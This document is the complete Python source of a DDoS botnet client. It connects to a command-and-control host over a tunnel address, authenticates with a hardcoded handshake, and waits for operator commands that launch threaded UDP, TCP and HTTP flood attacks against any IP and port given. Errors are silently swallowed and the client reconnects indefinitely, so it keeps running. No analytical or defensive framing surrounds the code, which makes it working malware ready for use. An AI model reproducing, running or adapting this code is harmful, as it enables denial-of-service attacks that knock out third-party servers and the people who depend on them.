import socket
import threading
import time
import random
import os
import sys

# CONFIGURATION
C2_ADDRESS  = "nlzpsjlvr.localto.net" # PLACEHOLDER
C2_PORT     = 3710

def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            data = os.urandom(size)
            for _ in range(100):
                s.sendto(data, (ip, dport))
            s.close()
        except:
            pass

def attack_tcp(ip, port, secs, size):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            data = os.urandom(size)
            while time.time() < secs:
                s.send(data)
        except:
            pass

def attack_http(ip, port, secs, method="GET"):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            request = f"{method} / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: BotLite\r\n\r\n"
            for _ in range(100):
                s.send(request.encode())
            s.close()
        except:
            pass

def main():
    while True:
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.connect((C2_ADDRESS, C2_PORT))

            # Handshake
            while True:
                data = c2.recv(1024).decode(errors='ignore')
                if 'MODE' in data:
                    c2.send('BotC2'.encode())
                    break
            while True:
                data = c2.recv(1024).decode(errors='ignore')
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break
            while True:
                data = c2.recv(1024).decode(errors='ignore')
                if 'Password' in data:
                    c2.send(b'\xff\xff\xff\xff\x75')
                    break
            
            # Command Loop
            while True:
                data = c2.recv(4096).decode(errors='ignore').strip()
                if not data:
                    break
                
                args = data.split(' ')
                command = args[0].upper()
                
                if command == '.UDP':
                    # .UDP IP PORT TIME SIZE THREADS
                    if len(args) >= 6:
                        threading.Thread(target=attack_udp, args=(args[1], int(args[2]), time.time() + int(args[3]), int(args[4]))).start()
                
                elif command == '.TCP':
                    # .TCP IP PORT TIME SIZE THREADS
                    if len(args) >= 6:
                        threading.Thread(target=attack_tcp, args=(args[1], int(args[2]), time.time() + int(args[3]), int(args[4]))).start()
                        
                elif command == '.HTTP':
                    # .HTTP URL PORT TIME ...
                    if len(args) >= 4:
                        # Simple parsing, mostly assuming IP for now to keep it lite
                        threading.Thread(target=attack_http, args=(args[1], int(args[2]), time.time() + int(args[3]))).start()

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except:
        pass
